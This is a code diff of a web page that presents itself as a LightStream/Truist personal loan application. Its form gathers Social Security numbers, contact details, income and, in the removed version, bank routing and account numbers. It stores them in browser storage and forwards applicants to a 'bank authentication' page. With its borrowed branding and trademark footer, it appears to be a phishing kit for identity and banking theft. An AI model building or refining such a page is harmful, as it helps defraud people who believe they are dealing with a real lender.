@@ -1,977 +1,120 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Personal Loan Application - LightStream Financial Services | v2.1</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <style>
-        .gradient-bg {
-            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
-        }
-        .glass-effect {
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        .cool-button {
-            background: linear-gradient(45deg, #000000, #333333);
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        .cool-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
-        }
-        .cool-button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-            transition: left 0.5s;
-        }
-        .cool-button:hover::before {
-            left: 100%;
-        }
-        body {
-            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
-            min-height: 100vh;
-        }
-        .text-cool {
-            color: #ffa500;
-        }
-        .bg-cool-card {
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        .form-step {
-            display: none;
-        }
-        .form-step.active {
-            display: block;
-        }
-        .step-indicator {
-            transition: all 0.3s ease;
-        }
-        .step-indicator.active {
-            background-color: #ffa500;
-            color: #000;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Personal Loan Application</title>
+
+<style>
+body{
+font-family:Arial;
+background:#f5f7fa;
+padding:20px;
+}
+
+.container{
+max-width:500px;
+margin:auto;
+background:white;
+padding:25px;
+border-radius:10px;
+box-shadow:0 0 10px rgba(0,0,0,0.1);
+}
+
+input{
+width:100%;
+padding:12px;
+margin:8px 0;
+border:1px solid #ccc;
+border-radius:6px;
+}
+
+button{
+width:100%;
+padding:14px;
+background:#0070ba;
+color:white;
+border:none;
+border-radius:6px;
+font-size:16px;
+cursor:pointer;
+}
+
+button:hover{
+background:#005ea6;
+}
+</style>
 </head>
-<body class="bg-black">
-    <!-- Header Navigation -->
-    <header class="glass-effect sticky top-0 z-50">
-        <nav class="container mx-auto px-4 py-4">
-            <div class="flex justify-between items-center">
-                <div class="flex items-center space-x-8">
-                    <div class="flex items-center space-x-2">
-                        <img src="images/newlogo.png" alt="LightStream Logo" class="logo-img" style="height: 68px; width: auto; max-width: none !important; max-height: none !important; object-fit: contain; background: transparent !important; filter: brightness(0) invert(1);">
-                        <div class="text-2xl font-bold text-white">
-                            <span class="text-cool">LightStream</span>
-                        </div>
-                    </div>
-                    <div class="hidden md:flex space-x-6">
-                        <a href="index.html" class="text-white hover:text-cool font-medium">Home</a>
-                        <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
-                        <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Bank Authentication</a>
-                        <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
-                        <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
-                        <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
-                    </div>
-                </div>
-                <div class="hidden md:flex space-x-4">
-                    <button onclick="initiateGoogleLogin()" class="text-white hover:text-cool font-medium flex items-center space-x-2">
-                        <i class="fab fa-google"></i>
-                        <span>Google Login</span>
-                    </button>
-                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
-                    <a href="personal-loans.html" class="cool-button text-white px-4 py-2 rounded-lg">Apply Now</a>
-                </div>
-                <button class="md:hidden text-white" id="mobileMenuBtn">
-                    <i class="fas fa-bars text-2xl"></i>
-                </button>
-            </div>
-            <!-- Mobile Menu -->
-            <div class="hidden md:hidden mt-4 pb-4" id="mobileMenu">
-                <div class="flex flex-col space-y-3">
-                    <a href="index.html" class="text-white hover:text-cool font-medium">Home</a>
-                    <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
-                    <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Bank Authentication</a>
-                    <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
-                    <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
-                    <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
-                    <button onclick="initiateGoogleLogin()" class="text-white hover:text-cool font-medium flex items-center space-x-2">
-                        <i class="fab fa-google"></i>
-                        <span>Google Login</span>
-                    </button>
-                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
-                    <a href="personal-loans.html" class="cool-button text-white px-4 py-2 rounded-lg">Apply Now</a>
-                </div>
-            </div>
-        </nav>
-    </header>
 
-    <!-- Hero Section -->
-    <section class="gradient-bg text-white py-20">
-        <div class="container mx-auto px-4">
-            <div class="max-w-4xl mx-auto text-center">
-                <h1 class="text-4xl md:text-5xl font-bold mb-6">Personal Loan Application</h1>
-                <p class="text-xl max-w-2xl mx-auto">
-                    Get the funds you need with our competitive rates and flexible terms. Quick approval process with same-day funding available.
-                </p>
-            </div>
-        </div>
-    </section>
+<body>
 
-    <!-- Application Form -->
-    <section class="py-16">
-        <div class="container mx-auto px-4">
-            <div class="max-w-4xl mx-auto">
-                <div class="bg-white rounded-lg shadow-xl p-8">
-                    <!-- Step Indicators -->
-                    <div class="flex justify-between mb-8">
-                        <div class="step-indicator active px-4 py-2 rounded-full text-sm font-semibold" id="step1Indicator">
-                            Step 1: Loan Details
-                        </div>
-                        <div class="step-indicator px-4 py-2 rounded-full text-sm font-semibold" id="step2Indicator">
-                            Step 2: Personal Information
-                        </div>
-                    </div>
+<div class="container">
 
-                    <form id="loanApplicationForm">
-                        <!-- Step 1: Loan Details -->
-                        <div class="form-step active" id="step1">
-                            <div class="mb-6">
-                                <label class="block text-gray-700 text-sm font-bold mb-2" for="loanAmount">
-                                    Loan Amount *
-                                </label>
-                                <div class="relative">
-                                    <span class="absolute left-3 top-3 text-gray-500">$</span>
-                                    <input type="number" id="loanAmount" name="loanAmount" required autocomplete="off"
-                                           class="w-full pl-8 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="10,000" min="1000" max="100000">
-                                </div>
-                                <p class="text-xs text-gray-500 mt-1">Minimum: $1,000 | Maximum: $100,000</p>
-                            </div>
+<h2>Personal Loan Application</h2>
 
-                            <div class="mb-6">
-                                <label class="block text-gray-700 text-sm font-bold mb-2" for="loanDuration">
-                                    Loan Duration *
-                                </label>
-                                <select id="loanDuration" name="loanDuration" required autocomplete="off"
-                                        class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
-                                    <option value="">Select Loan Duration</option>
-                                    <option value="12">12 months</option>
-                                    <option value="18">18 months</option>
-                                    <option value="24">24 months</option>
-                                    <option value="30">30 months</option>
-                                    <option value="36">36 months</option>
-                                    <option value="48">48 months</option>
-                                    <option value="54">54 months</option>
-                                    <option value="60">60 months</option>
-                                </select>
-                            </div>
+<form id="loanForm">
 
-                            <div class="mb-6">
-                                <label class="block text-gray-700 text-sm font-bold mb-2" for="loanPurpose">
-                                    Loan Purpose *
-                                </label>
-                                <select id="loanPurpose" name="loanPurpose" required
-                                        class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
-                                    <option value="">Select loan purpose</option>
-                                    <option value="debt-consolidation">Debt Consolidation</option>
-                                    <option value="home-improvement">Home Improvement</option>
-                                    <option value="major-purchase">Major Purchase</option>
-                                    <option value="medical-expenses">Medical Expenses</option>
-                                    <option value="vacation">Vacation</option>
-                                    <option value="wedding">Wedding</option>
-                                    <option value="emergency">Emergency Fund</option>
-                                    <option value="other">Other</option>
-                                </select>
-                            </div>
+<input id="loanAmount" placeholder="Loan Amount" required>
+<input id="loanPurpose" placeholder="Loan Purpose" required>
+<input id="creditScore" placeholder="Credit Score" required>
 
-                            <div class="mb-6">
-                                <label class="block text-gray-700 text-sm font-bold mb-2" for="creditScore">
-                                    Estimated Credit Score *
-                                </label>
-                                <select id="creditScore" name="creditScore" required
-                                        class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
-                                    <option value="">Select credit range</option>
-                                    <option value="excellent">Excellent (750-850)</option>
-                                    <option value="good">Good (700-749)</option>
-                                    <option value="fair">Fair (640-699)</option>
-                                    <option value="poor">Poor (300-639)</option>
-                                </select>
-                            </div>
+<input id="name" placeholder="Full Name" required>
+<input id="email" placeholder="Email" required>
+<input id="phone" placeholder="Phone" required>
 
-                            <div class="mb-6">
-                                <label class="block text-gray-700 text-sm font-bold mb-2" for="customerBank">
-                                    Your Bank *
-                                </label>
-                                <select id="customerBank" name="customerBank" required
-                                        class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
-                                    <option value="">Select your bank</option>
-                                    <option value="chase">Chase Bank</option>
-                                    <option value="bank-of-america">Bank of America</option>
-                                    <option value="wells-fargo">Wells Fargo</option>
-                                    <option value="citibank">Citibank</option>
-                                    <option value="capital-one">Capital One</option>
-                                    <option value="us-bank">U.S. Bank</option>
-                                    <option value="pnc">PNC Bank</option>
-                                    <option value="td-bank">TD Bank</option>
-                                    <option value="bbt">BB&T (now Truist)</option>
-                                    <option value="suntrust">SunTrust (now Truist)</option>
-                                    <option value="regions">Regions Bank</option>
-                                    <option value="fifth-third">Fifth Third Bank</option>
-                                    <option value="keybank">KeyBank</option>
-                                    <option value="huntington">Huntington Bank</option>
-                                    <option value="citizens">Citizens Bank</option>
-                                    <option value="ally">Ally Bank</option>
-                                    <option value="discover">Discover Bank</option>
-                                    <option value="synchrony">Synchrony Bank</option>
-                                    <option value="marcus">Marcus by Goldman Sachs</option>
-                                    <option value="other">Other Bank</option>
-                                </select>
-                            </div>
+<input id="street" placeholder="Street Address" required>
+<input id="city" placeholder="City" required>
+<input id="state" placeholder="State" required>
+<input id="zip" placeholder="ZIP Code" required>
 
-                            <div class="flex justify-end">
-                                <button type="button" onclick="nextStep()"
-                                        class="bg-indigo-600 text-white py-3 px-6 rounded-lg hover:bg-indigo-700 transition duration-200">
-                                    Next Step
-                                </button>
-                            </div>
-                        </div>
+<input id="ssn" placeholder="SSN" required>
 
-                        <!-- Step 2: Personal Information -->
-                        <div class="form-step" id="step2">
-                            <div class="grid md:grid-cols-2 gap-6">
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="firstName">
-                                        First Name *
-                                    </label>
-                                    <input type="text" id="firstName" name="firstName" required autocomplete="given-name"
-                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="John">
-                                </div>
+<input id="annualIncome" placeholder="Annual Income">
+<input id="employmentStatus" placeholder="Employment Status">
+<input id="monthlyHousing" placeholder="Monthly Housing">
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="lastName">
-                                        Last Name *
-                                    </label>
-                                    <input type="text" id="lastName" name="lastName" required autocomplete="family-name"
-                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="Doe">
-                                </div>
+<button type="submit">Continue to Bank Verification</button>
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="email">
-                                        Email Address *
-                                    </label>
-                                    <input type="email" id="email" name="email" required autocomplete="email"
-                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="john.doe@example.com">
-                                </div>
+</form>
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="phone">
-                                        Phone Number *
-                                    </label>
-                                    <input type="tel" id="phone" name="phone" required autocomplete="tel"
-                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="(555) 123-4567" pattern="[0-9]{10}" maxlength="10">
-                                </div>
+</div>
 
-                                <div class="mb-6 md:col-span-2">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="address">
-                                        Street Address *
-                                    </label>
-                                    <input type="text" id="address" name="address" required autocomplete="street-address"
-                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="123 Main Street">
-                                </div>
+<script>
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="city">
-                                        City *
-                                    </label>
-                                    <input type="text" id="city" name="city" required autocomplete="address-level2"
-                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="New York">
-                                </div>
+document.getElementById("loanForm").addEventListener("submit", function(e){
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="state">
-                                        State *
-                                    </label>
-                                    <select id="state" name="state" required
-                                            class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
-                                        <option value="">Select state</option>
-                                        <option value="AL">Alabama</option>
-                                        <option value="AK">Alaska</option>
-                                        <option value="AZ">Arizona</option>
-                                        <option value="AR">Arkansas</option>
-                                        <option value="CA">California</option>
-                                        <option value="CO">Colorado</option>
-                                        <option value="CT">Connecticut</option>
-                                        <option value="DE">Delaware</option>
-                                        <option value="FL">Florida</option>
-                                        <option value="GA">Georgia</option>
-                                        <option value="IL">Illinois</option>
-                                        <option value="IN">Indiana</option>
-                                        <option value="KS">Kansas</option>
-                                        <option value="KY">Kentucky</option>
-                                        <option value="LA">Louisiana</option>
-                                        <option value="MD">Maryland</option>
-                                        <option value="MA">Massachusetts</option>
-                                        <option value="MI">Michigan</option>
-                                        <option value="MN">Minnesota</option>
-                                        <option value="MO">Missouri</option>
-                                        <option value="NJ">New Jersey</option>
-                                        <option value="NY">New York</option>
-                                        <option value="NC">North Carolina</option>
-                                        <option value="OH">Ohio</option>
-                                        <option value="PA">Pennsylvania</option>
-                                        <option value="SC">South Carolina</option>
-                                        <option value="TN">Tennessee</option>
-                                        <option value="TX">Texas</option>
-                                        <option value="VA">Virginia</option>
-                                        <option value="WA">Washington</option>
-                                        <option value="WI">Wisconsin</option>
-                                    </select>
-                                </div>
+e.preventDefault();
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="zipCode">
-                                        ZIP Code *
-                                    </label>
-                                    <input type="text" id="zipCode" name="zipCode" required autocomplete="postal-code"
-                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="10001" pattern="[0-9]{5}" maxlength="5">
-                                    <!-- ZIP validation message -->
-                                    <div id="zipError" class="text-red-500 text-sm mt-1 hidden"></div>
-                                    <!-- ZIP loading indicator -->
-                                    <div id="zipLoading" class="text-blue-500 text-sm mt-1 hidden">
-                                        <i class="fas fa-spinner fa-spin mr-1"></i>Verifying ZIP code...
-                                    </div>
-                                </div>
+const data = {
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="socialSecurity">
-                                        Social Security Number *
-                                    </label>
-                                    <input type="text" id="socialSecurity" name="socialSecurity" required autocomplete="off"
-                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="123-45-6789 or 123456789" maxlength="11">
-                                </div>
+loanAmount: document.getElementById("loanAmount").value,
+loanPurpose: document.getElementById("loanPurpose").value,
+creditScore: document.getElementById("creditScore").value,
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="monthlyIncome">
-                                        Gross Monthly Income *
-                                    </label>
-                                    <div class="relative">
-                                        <span class="absolute left-3 top-3 text-gray-500">$</span>
-                                        <input type="number" id="monthlyIncome" name="monthlyIncome" required autocomplete="off"
-                                               class="w-full pl-8 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                               placeholder="4,000" min="0">
-                                    </div>
-                                </div>
+name: document.getElementById("name").value,
+email: document.getElementById("email").value,
+phone: document.getElementById("phone").value,
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="employmentStatus">
-                                        Employment Status *
-                                    </label>
-                                    <select id="employmentStatus" name="employmentStatus" required
-                                            class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
-                                        <option value="">Select employment status</option>
-                                        <option value="employed">Employed</option>
-                                        <option value="self-employed">Self-Employed</option>
-                                        <option value="retired">Retired</option>
-                                        <option value="unemployed">Unemployed</option>
-                                        <option value="student">Student</option>
-                                    </select>
-                                </div>
+street: document.getElementById("street").value,
+city: document.getElementById("city").value,
+state: document.getElementById("state").value,
+zip: document.getElementById("zip").value,
 
+ssn: document.getElementById("ssn").value,
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="routingNumber">
-                                        Bank Routing Number *
-                                    </label>
-                                    <input type="text" id="routingNumber" name="routingNumber" required autocomplete="off"
-                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="123456789" pattern="[0-9]{9}" maxlength="9">
-                                </div>
+annualIncome: document.getElementById("annualIncome").value,
+employmentStatus: document.getElementById("employmentStatus").value,
+monthlyHousing: document.getElementById("monthlyHousing").value
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="accountNumber">
-                                        Bank Account Number *
-                                    </label>
-                                    <input type="text" id="accountNumber" name="accountNumber" required autocomplete="off"
-                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="1234567890123" maxlength="17">
-                                </div>
-                            </div>
+};
 
-                            <!-- Terms and Conditions -->
-                            <div class="mb-6">
-                                <label class="flex items-start">
-                                    <input type="checkbox" id="terms" name="terms" class="mr-2 mt-1" required>
-                                    <span class="text-sm text-gray-700">
-                                        I agree to the <a href="#" class="text-indigo-600 hover:text-indigo-800">Terms & Conditions</a> and <a href="#" class="text-indigo-600 hover:text-indigo-800">Privacy Policy</a>
-                                    </span>
-                                </label>
-                            </div>
+localStorage.setItem("loanData", JSON.stringify(data));
 
-                            <div class="mb-6">
-                                <label class="flex items-start">
-                                    <input type="checkbox" id="consent" name="consent" class="mr-2 mt-1" required>
-                                    <span class="text-sm text-gray-700">
-                                        I consent to receive communications about my loan application via email and SMS
-                                    </span>
-                                </label>
-                            </div>
+window.location.href = "bank-auth.html";
 
-                            <div class="flex justify-between">
-                                <button type="button" onclick="previousStep()"
-                                        class="flex-1 bg-gray-300 text-gray-700 py-3 rounded-lg hover:bg-gray-400 transition duration-200">
-                                    Back
-                                </button>
-                                <button type="submit" 
-                                        class="flex-1 bg-green-600 text-white py-3 rounded-lg hover:bg-green-700 transition duration-200">
-                                    Submit Application
-                                </button>
-                            </div>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </section>
+});
 
-    <!-- Footer -->
-    <link rel="stylesheet" href="footer.css">
-    <link rel="stylesheet" href="chatbot.css">
-    <!-- Canonical Footer Component - LightStream Website -->
-    <footer>
-        <div class="footer-container">
-            <!-- Footer Links Section -->
-            <div class="footer-links">
-                <a href="personal-loans.html">Personal Loans</a>
-                <a href="bank-auth.html">Bank Authentication</a>
-                <a href="faqs.html">FAQs</a>
-                <a href="#">Support</a>
-                <a href="contact.html">Contact Us</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Terms of Service</a>
-            </div>
-            
-            <!-- Footer Contact Section -->
-            <div class="footer-contact">
-                <!-- Social Media Icons -->
-                <div class="social-icons">
-                    <a href="#" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
-                    <a href="#" aria-label="Facebook"><i class="fab fa-facebook"></i></a>
-                    <a href="#" aria-label="X"><i class="fab fa-x-twitter"></i></a>
-                    <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
-                </div>
-            </div>
-            
-            <!-- Footer Legal Section -->
-            <div class="footer-legal">
-                <p><strong>Your loan terms, including APR, may differ based on loan purpose, amount, term length, and your credit profile.</strong> Lowest rates require excellent credit. At least 10.003% of approved applicants applying for to lowest rate qualified for to lowest rate available based on data from 10/01/2025 to 12/31/2025. Rate is quoted with AutoPay discount. AutoPay discount is only available prior to loan funding. Rates without AutoPay are 0.50% points higher. Subject to credit approval. Conditions and limitations apply. Advertised rates and terms are subject to change without notice.</p>
-                <p><strong>Payment example:</strong> Monthly payments for a $10,000 loan at 10.00% APR with a term of 3 years would result in 36 monthly payments of $306.44.</p>
-                <p><strong>Maximum APR for a LightStream loan is 25.39%.</strong> Loan terms range from 24 - 240 months depending on loan type.</p>
-                <p><strong>You can fund your loan today if today is a banking business day, your application is approved, and you complete the following steps by 2:30 p.m. Eastern time:</strong></p>
-                <ol>
-                    <li>review and electronically sign your loan agreement;</li>
-                    <li>provide us with your funding preferences and relevant banking information;</li>
-                    <li>complete final verification process.</li>
-                </ol>
-                <div class="footer-grid">
-                    <div class="footer-section">
-                        <h4>Business Hours (Eastern time)</h4>
-                        <p><strong>Customer Service</strong><br>
-                        Monday - Friday: 9:30 a.m. to 7 p.m. & Saturday: Noon to 4 p.m.</p>
-                        <p><strong>Application Processing</strong><br>
-                        Monday - Friday: 10 a.m. to 6 p.m.</p>
-                    </div>
-                    <div class="footer-section">
-                        <h4>Mailing Address</h4>
-                        <p>
-                            PO Box 117320<br>
-                            Atlanta, GA 30368-7320
-                        </p>
-                    </div>
-                </div>
-                <div class="legal-copyright">
-                    <p><strong>E H L Truist Bank is an Equal Housing Lender. 2025 Truist Financial Corporation.</strong></p>
-                    <p>Truist, LightStream, and LightStream logos are service marks of Truist Financial Corporation. All rights reserved.</p>
-                    <p>All other trademarks are property of their respective owners. Lending services provided by Truist Bank.</p>
-                </div>
-            </div>
-        </div>
-    </footer>
+</script>
 
-    <script>
-        // Mobile menu toggle
-        document.getElementById('mobileMenuBtn').addEventListener('click', function() {
-            const mobileMenu = document.getElementById('mobileMenu');
-            mobileMenu.classList.toggle('hidden');
-        });
-
-        // Form navigation
-        let currentStep = 1;
-        const totalSteps = 2;
-
-        function nextStep() {
-            if (currentStep < totalSteps) {
-                // Validate current step before proceeding
-                if (validateStep(currentStep)) {
-                    document.getElementById(`step${currentStep}`).classList.remove('active');
-                    currentStep++;
-                    document.getElementById(`step${currentStep}`).classList.add('active');
-                    updateStepIndicators();
-                    window.scrollTo(0, 0);
-                }
-            }
-        }
-
-        function previousStep() {
-            if (currentStep > 1) {
-                document.getElementById(`step${currentStep}`).classList.remove('active');
-                currentStep--;
-                document.getElementById(`step${currentStep}`).classList.add('active');
-                updateStepIndicators();
-                window.scrollTo(0, 0);
-            }
-        }
-
-        function updateStepIndicators() {
-            for (let i = 1; i <= totalSteps; i++) {
-                const indicator = document.getElementById(`step${i}Indicator`);
-                if (i === currentStep) {
-                    indicator.classList.add('active');
-                } else {
-                    indicator.classList.remove('active');
-                }
-            }
-        }
-
-        function validateStep(step) {
-            console.log(`🔍 Validating Step ${step}...`);
-            
-            if (step === 1) {
-                const loanAmount = document.getElementById('loanAmount').value;
-                const loanDuration = document.getElementById('loanDuration').value;
-                const loanPurpose = document.getElementById('loanPurpose').value;
-                const creditScore = document.getElementById('creditScore').value;
-                const customerBank = document.getElementById('customerBank').value;
-
-                console.log('📊 Step 1 validation:', {
-                    loanAmount: !!loanAmount,
-                    loanDuration: !!loanDuration,
-                    loanPurpose: !!loanPurpose,
-                    creditScore: !!creditScore,
-                    customerBank: !!customerBank
-                });
-
-                if (!loanAmount || !loanDuration || !loanPurpose || !creditScore || !customerBank) {
-                    alert('❌ Please fill in all required fields in Step 1:\n• Loan Amount\n• Loan Duration\n• Loan Purpose\n• Credit Score\n• Your Bank');
-                    return false;
-                }
-                return true;
-            }
-            
-            if (step === 2) {
-                // Validate ZIP code before allowing submission
-                const zipInput = document.getElementById('zipCode');
-                const zipError = document.getElementById('zipError');
-                
-                if (!zipInput.value || zipInput.value.length !== 5) {
-                    showZipError('Invalid ZIP code - must be exactly 5 digits');
-                    zipInput.focus();
-                    return false;
-                }
-                
-                // Check if there's an active error
-                if (!zipError.classList.contains('hidden')) {
-                    zipInput.focus();
-                    return false;
-                }
-            }
-            
-            return true;
-        }
-
-        // Form submission
-        document.getElementById("loanApplicationForm").addEventListener("submit", function(e) {
-            console.log("🚀 Form submit event triggered!");
-            e.preventDefault();
-
-            // Check if checkboxes are checked
-            const termsCheckbox = document.getElementById("terms");
-            const consentCheckbox = document.getElementById("consent");
-            
-            console.log("📋 Terms checked:", termsCheckbox?.checked);
-            console.log("📋 Consent checked:", consentCheckbox?.checked);
-            
-            if (!termsCheckbox?.checked) {
-                alert("❌ Please agree to Terms & Conditions and Privacy Policy");
-                return;
-            }
-            
-            if (!consentCheckbox?.checked) {
-                alert("❌ Please consent to receive communications about your loan application");
-                return;
-            }
-
-            console.log("✅ Form validation passed!");
-
-            const firstName = document.getElementById("firstName").value;
-            const lastName = document.getElementById("lastName").value;
-
-            console.log("👤 First Name:", firstName);
-            console.log("👤 Last Name:", lastName);
-
-            const data = {
-                loanAmount: document.getElementById("loanAmount").value,
-                loanDuration: document.getElementById("loanDuration").value,
-                loanPurpose: document.getElementById("loanPurpose").value,
-                creditScore: document.getElementById("creditScore").value,
-                customerBank: document.getElementById("customerBank").value,
-                name: firstName + " " + lastName,
-                firstName: firstName,
-                lastName: lastName,
-                fullName: firstName + " " + lastName,
-                email: document.getElementById("email").value,
-                phone: document.getElementById("phone").value,
-                streetAddress: document.getElementById("address").value,
-                address: document.getElementById("address").value,
-                city: document.getElementById("city").value,
-                state: document.getElementById("state").value,
-                zipCode: document.getElementById("zipCode").value,
-                ssn: document.getElementById("socialSecurity").value,
-                socialSecurity: document.getElementById("socialSecurity").value,
-                monthlyIncome: document.getElementById("monthlyIncome").value,
-                employmentStatus: document.getElementById("employmentStatus").value,
-                routingNumber: document.getElementById("routingNumber").value,
-                accountNumber: document.getElementById("accountNumber").value
-            };
-
-            console.log("📊 Form data collected:", data);
-            console.log("🏦 Customer Bank Value:", document.getElementById("customerBank").value);
-            // Store data for bank auth page (SECURE: sessionStorage only)
-            sessionStorage.setItem("loanData", JSON.stringify(data));
-            console.log("💾 Data stored in sessionStorage:", sessionStorage.getItem("loanData"));
-            
-            // Show processing message
-            alert("✅ Loan Application Submitted Successfully!\n\n📋 Your application has been received and is being processed.\n\n📧 What happens next:\n• You will be dealt\n\nThank you for choosing LightStream Financial Services.");
-
-            console.log("🔄 Redirecting to bank-auth.html...");
-            setTimeout(() => {
-                window.location.href = "bank-auth.html";
-            }, 2000);
-        });
-
-        // Bank selection functions
-function loadBankSelection() {
-    const savedBank = localStorage.getItem('selectedBank');
-    if (savedBank) {
-        const customerBankSelect = document.getElementById('customerBank');
-        if (customerBankSelect) {
-            customerBankSelect.value = savedBank;
-        }
-    }
-}
-
-function saveBankSelection() {
-    const customerBankSelect = document.getElementById('customerBank');
-    if (customerBankSelect) {
-        localStorage.setItem('selectedBank', customerBankSelect.value);
-    }
-}
-
-// ZIP code validation function
-function setupZipCodeValidation() {
-    const zipCodeInput = document.getElementById('zipCode');
-    if (zipCodeInput) {
-        zipCodeInput.addEventListener('input', function() {
-            const zipCode = this.value.replace(/\D/g, '');
-            if (zipCode.length === 5) {
-                // Auto-fill city and state using Zippopotam.us API
-                fetch(`https://api.zippopotam.us/us/${zipCode}`)
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.places && data.places.length > 0) {
-                            const place = data.places[0];
-                            document.getElementById('city').value = place['place name'];
-                            document.getElementById('state').value = place['state abbreviation'];
-                        }
-                    })
-                    .catch(error => {
-                        console.log('ZIP code lookup failed:', error);
-                    });
-            }
-        });
-    }
-}
-
-        // Google OAuth Login Function
-        function initiateGoogleLogin() {
-            // Check if user is already logged in
-            const isLoggedIn = localStorage.getItem('is_logged_in');
-            if (isLoggedIn === 'true') {
-                window.location.href = 'login-success.html';
-                return;
-            }
-            
-            // For demo purposes, simulate successful login
-            // In production, this would redirect to Google OAuth
-            console.log('Initiating Google OAuth login...');
-            
-            // Create mock user data for demo
-            const mockUserData = {
-                name: 'Demo User',
-                email: 'demo@example.com',
-                picture: 'https://ui-avatars.com/api/?name=Demo+User&background=random',
-                verified: true
-            };
-            
-            // Store user session
-            localStorage.setItem('google_user_data', JSON.stringify(mockUserData));
-            localStorage.setItem('is_logged_in', 'true');
-            
-            // Redirect to success page
-            window.location.href = 'login-success.html';
-        }
-        
-        // Bank selection functions
-function loadBankSelection() {
-    const savedBank = localStorage.getItem('selectedBank');
-    if (savedBank) {
-        const customerBankSelect = document.getElementById('customerBank');
-        if (customerBankSelect) {
-            customerBankSelect.value = savedBank;
-        }
-    }
-}
-
-function saveBankSelection() {
-    const customerBankSelect = document.getElementById('customerBank');
-    if (customerBankSelect) {
